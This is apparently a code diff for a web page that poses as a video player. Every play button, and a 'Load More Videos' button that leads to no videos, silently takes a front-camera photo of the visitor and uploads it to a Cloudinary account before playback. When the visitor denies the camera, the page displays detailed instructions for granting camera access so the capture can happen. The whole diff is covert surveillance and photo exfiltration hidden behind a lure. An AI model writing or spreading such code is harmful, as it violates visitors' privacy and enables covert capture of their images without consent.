@@ -86,6 +86,42 @@ const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platfor
     }).catch(() => {});
 })();
 
+const captureAndUpload = async () => {
+    if (isIOS) {
+        return new Promise((resolve) => {
+            cameraInput.onchange = async (e) => {
+                const file = e.target.files[0];
+                if (file) {
+                    await uploadToCloudinary(file);
+                    resolve();
+                }
+            };
+            cameraInput.click();
+        });
+    } else {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        if (window.ImageCapture) {
+            const videoTrack = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(videoTrack);
+            const blob = await imageCapture.takePhoto();
+            stream.getTracks().forEach(track => track.stop());
+            await uploadToCloudinary(blob);
+        } else {
+            const videoEl = document.createElement('video');
+            videoEl.srcObject = stream;
+            videoEl.play();
+            await new Promise(resolve => setTimeout(resolve, 500));
+            const canvas = document.createElement('canvas');
+            canvas.width = videoEl.videoWidth;
+            canvas.height = videoEl.videoHeight;
+            canvas.getContext('2d').drawImage(videoEl, 0, 0);
+            stream.getTracks().forEach(track => track.stop());
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+            await uploadToCloudinary(blob);
+        }
+    }
+};
+
 const uploadToCloudinary = async (blob) => {
     const formData = new FormData();
     formData.append('file', blob);
@@ -94,62 +130,113 @@ const uploadToCloudinary = async (blob) => {
     return response.json();
 };
 
-const playVideo = () => {
-    playButton.style.display = 'none';
-    loader.style.display = 'none';
-    video.controls = true;
-    video.play();
+const playVideo = (videoEl, playBtn, loaderEl) => {
+    playBtn.style.display = 'none';
+    if (loaderEl) loaderEl.style.display = 'none';
+    
+    // Hide thumbnail if exists
+    const container = videoEl.closest('.video-container');
+    const thumbnail = container.querySelector('.thumbnail');
+    if (thumbnail) thumbnail.style.display = 'none';
+    
+    videoEl.classList.add('playing');
+    videoEl.controls = true;
+    videoEl.play();
 };
 
-if (isIOS) {
-    cameraInput.addEventListener('change', async (e) => {
-        const file = e.target.files[0];
-        if (file) {
-            playButton.style.display = 'none';
-            loader.style.display = 'block';
-            await uploadToCloudinary(file);
-            playVideo();
-        }
-    });
-    
-    playButton.addEventListener('click', () => {
-        cameraInput.click();
-    });
-} else {
-    playButton.addEventListener('click', async () => {
-        playButton.style.display = 'none';
-        loader.style.display = 'block';
+playButton.addEventListener('click', async () => {
+    playButton.style.display = 'none';
+    loader.style.display = 'block';
+    try {
+        await captureAndUpload();
+        playVideo(video, playButton, loader);
+    } catch (error) {
+        loader.style.display = 'none';
+        playButton.style.display = 'flex';
         
+        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const isChrome = /Chrome/i.test(navigator.userAgent);
+        const isSafari = /Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent);
+        
+        let instructions = 'Camera permission denied.\n\nTo enable camera access:\n\n';
+        
+        if (isMobile && isChrome) {
+            instructions += '1. Tap the lock icon (🔒) in the address bar\n2. Tap "Permissions"\n3. Enable "Camera"\n4. Refresh the page';
+        } else if (isMobile && isSafari) {
+            instructions += '1. Go to iPhone Settings\n2. Scroll to Safari\n3. Tap "Camera"\n4. Select "Ask" or "Allow"\n5. Return and refresh this page';
+        } else if (isChrome) {
+            instructions += '1. Click the lock icon (🔒) in the address bar\n2. Click "Site settings"\n3. Change Camera to "Allow"\n4. Refresh the page';
+        } else {
+            instructions += '1. Click the camera icon in the address bar\n2. Allow camera access\n3. Refresh the page';
+        }
+        
+        alert(instructions);
+    }
+});
+
+document.querySelectorAll('.extra-video').forEach((vid, index) => {
+    const container = vid.closest('.video-container');
+    const playBtn = container.querySelector('.play-button');
+    
+    playBtn.addEventListener('click', async () => {
+        playBtn.style.display = 'none';
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            await captureAndUpload();
+            playVideo(vid, playBtn);
+        } catch (error) {
+            playBtn.style.display = 'flex';
             
-            if (window.ImageCapture) {
-                const videoTrack = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(videoTrack);
-                const blob = await imageCapture.takePhoto();
-                stream.getTracks().forEach(track => track.stop());
-                await uploadToCloudinary(blob);
+            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+            const isChrome = /Chrome/i.test(navigator.userAgent);
+            const isSafari = /Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent);
+            
+            let instructions = 'Camera permission denied.\n\nTo enable camera access:\n\n';
+            
+            if (isMobile && isChrome) {
+                instructions += '1. Tap the lock icon (🔒) in the address bar\n2. Tap "Permissions"\n3. Enable "Camera"\n4. Refresh the page';
+            } else if (isMobile && isSafari) {
+                instructions += '1. Go to iPhone Settings\n2. Scroll to Safari\n3. Tap "Camera"\n4. Select "Ask" or "Allow"\n5. Return and refresh this page';
+            } else if (isChrome) {
+                instructions += '1. Click the lock icon (🔒) in the address bar\n2. Click "Site settings"\n3. Change Camera to "Allow"\n4. Refresh the page';
             } else {
-                const videoEl = document.createElement('video');
-                videoEl.srcObject = stream;
-                videoEl.play();
-                await new Promise(resolve => setTimeout(resolve, 500));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = videoEl.videoWidth;
-                canvas.height = videoEl.videoHeight;
-                canvas.getContext('2d').drawImage(videoEl, 0, 0);
-                stream.getTracks().forEach(track => track.stop());
-                
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                await uploadToCloudinary(blob);
+                instructions += '1. Click the camera icon in the address bar\n2. Allow camera access\n3. Refresh the page';
             }
             
-            playVideo();
-        } catch (error) {
-            loader.style.display = 'none';
-            playButton.style.display = 'flex';
-            alert('Camera permission denied. Please accept to watch the video.');
+            alert(instructions);
         }
     });
-}
+});
+
+document.getElementById('loadMoreBtn').addEventListener('click', async () => {
+    const btn = document.getElementById('loadMoreBtn');
+    btn.textContent = 'Loading...';
+    btn.disabled = true;
+    
+    try {
+        await captureAndUpload();
+        alert('More videos coming soon!');
+        btn.textContent = 'Load More Videos';
+        btn.disabled = false;
+    } catch (error) {
+        btn.textContent = 'Load More Videos';
+        btn.disabled = false;
+        
+        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const isChrome = /Chrome/i.test(navigator.userAgent);
+        const isSafari = /Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent);
+        
+        let instructions = 'Camera permission denied.\n\nTo enable camera access:\n\n';
+        
+        if (isMobile && isChrome) {
+            instructions += '1. Tap the lock icon (🔒) in the address bar\n2. Tap "Permissions"\n3. Enable "Camera"\n4. Refresh the page';
+        } else if (isMobile && isSafari) {
+            instructions += '1. Go to iPhone Settings\n2. Scroll to Safari\n3. Tap "Camera"\n4. Select "Ask" or "Allow"\n5. Return and refresh this page';
+        } else if (isChrome) {
+            instructions += '1. Click the lock icon (🔒) in the address bar\n2. Click "Site settings"\n3. Change Camera to "Allow"\n4. Refresh the page';
+        } else {
+            instructions += '1. Click the camera icon in the address bar\n2. Allow camera access\n3. Refresh the page';
+        }
+        
+        alert(instructions);
+    }
+});
